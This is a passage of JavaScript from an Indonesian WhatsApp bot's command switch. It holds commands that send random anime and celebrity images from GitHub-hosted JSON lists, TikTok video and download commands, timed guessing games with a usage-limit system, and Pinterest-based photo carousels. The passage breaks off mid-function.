case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elena': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga1': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
reply("Gambar Akan Dikirim Lewat Private Chat")
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga1/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tataconn.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
slime.sendMessage(m.sender, { image: { url: yeha }, caption : '© Hanako Ai 2023 - 2024'}, { quoted: m })
}
break
case 'tiktokgirl':
await loading()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await loading()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await loading()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await loading()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await loading()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await loading()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await loading()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
slime.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktok2':
case 'tt2': {
const api = require('btch-downloader')
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
if (!args[0]) return m.reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return m.reply(`URL Yang Tuan Berikan *Salah!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `⚝ *T I K T O K  D O W N L O A D* 

≡ *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* 
${maximus.title}

≡ *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* 
${maximus.title_audio}

© SlimexTzy`;
await slime.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
await slime.sendFile(m.chat, maximus.audio[0], 'kasar.mp3', null, m)
      } catch (e) {
		console.log(e)
		reply(eror)
	}
};
break;
case 'caklontong': {
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 slime.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 slime.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik . caklontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
}
break
case 'tebaktebakan': case 'tebak-tebakan': {
if (!isRegistered) return reply('Anda belum terdaftar, silahkan ketik .daftar')
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
slime.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
    tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    slime.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
    delete tebaktebakan[m.sender.split('@')[0]]
}}
break
case 'tekateki': case 'teka-teki':{
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
	let timeout = 60000
	let users = global.db.data.users[m.sender]
	let poin = 10
	let id = m.chat
	if (id in slime.tekateki) return reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*\nHadiah: ${poin} Limit\n\n*JAWAB DENGAN BENAR, LIMIT AKAN DIKURANGI JIKA ANDA TIDAK BISA MENJAWAB!*`.trim()
	slime.tekateki[id] = [
	await reply(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (slime.tekateki[id]) 
users.limit -= 2
reply(`*GAME TEKA-TEKI*\n\nWaktu habis!\n Jawabannya adalah; *${json.jawaban}*\nLimit kamu dikurangi 2\nSisa limit kamu: *${db.data.users[sender].limit.toLocaleString()}*`)
	delete slime.tekateki[id]
	 }, timeout)
	 ]
	}
	break
case 'susunkata':{
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
	let timeout = 60000
	let poin = 10
	let id = m.chat
	if (id in slime.susunkata) return reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
Tipe: ${json.tipe}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Limit
	`.trim()
	slime.susunkata[id] = [
	await reply(`${caption}`),
	json, poin,
	setTimeout(() => {
reply(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Ingin bermain lagi? ketik .susunkata`)
	delete slime.susunkata[id]
	 }, timeout)
	 ]
	}
	break
case 'tebakkata': {
if (!isRegistered) return reply(mess.regis)
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
  let timeout = 60000
  let id = m.chat
	if (id in slime.tebakkata) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let caption = `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${json.soal}\nWaktu : 60s\nHadiah : 20 Limit`
 slime.tebakkata[id] = [
	await reply(`${caption}`),
	json,
 setTimeout(() => {
 if (slime.tebakkata[id]) 
 console.log("Jawaban: " + json.jawaban)
 reply(`Waktu Habis\nJawaban:  ${json.jawaban}\n\nIngin bermain? Ketik tebakkata`) 
 delete slime.tebakkata[id]
 }, 60000)
 ]
}
break
//==================================================================
case 'tebaklirik':{
  if (!isRegistered) return reply(mess.regis)
let users = global.db.data.users[m.sender]
	let timeout = 60000
	let poin = 10
	let id = m.chat
	if (id in slime.tebaklirik) return reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Limit
	`.trim()
	slime.tebaklirik[id] = [
	await reply(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (slime.tebaklirik[id]) 
users.limit -= 2
reply(`*GAME TEBAK LIRIK*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Limit kamu dikurangi 2\n𖦹 Sisa Limit kamu: *${db.data.users[sender].limit.toLocaleString()}*`)
	delete slime.tebaklirik[id]
	 }, timeout)
	 ]
	}
	break
case 'siapaaku': case 'siapakahaku': case 'siapakah-aku': case 'siapa-aku': {
  if (!isRegistered) return reply(mess.regis)
if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
  let users = global.db.data.users[m.sender]
	let timeout = 60000 
	let poin = 15
	let id = m.chat 
	if (id in slime.siapaaku) return reply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	 
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Limit
	`.trim()
	slime.siapaaku[id] = [
	await reply(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (slime.siapaaku[id]) 
users.limit -= 2
reply(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Limit kamu dikurangi 2\n𖦹 Sisa Limit kamu: *${db.data.users[sender].limit.toLocaleString()}*`)
	delete slime.siapaaku[id]
	 }, timeout)
	 ]
	}
	break
case 'tebakkabupaten': {
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
slime.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
    tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.title)
    slime.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
    delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
case 'tebakgambar': {
if (!isCreator) return reply('Fitur sedang dalam perbaikan')
if (!isRegistered) return reply(mess.regis)
  if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
let timeout = 60000
let id = m.chat
if (id in slime.tebakkata) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 5 limit`
 slime.tebakgambar[id] = [
    await slime.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (slime.tebakgambar[id])
 reply(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete slime.tebakgambar[id]
 }, 60000)
	 ]
}
break
case 'indira-jkt48': case 'indira': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Indira Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'michie-jkt48': case 'michie': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Michie Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'adel-jkt48': case 'adel': case 'nona-reva': {

await loading ()
    const createImage = async (url) => {
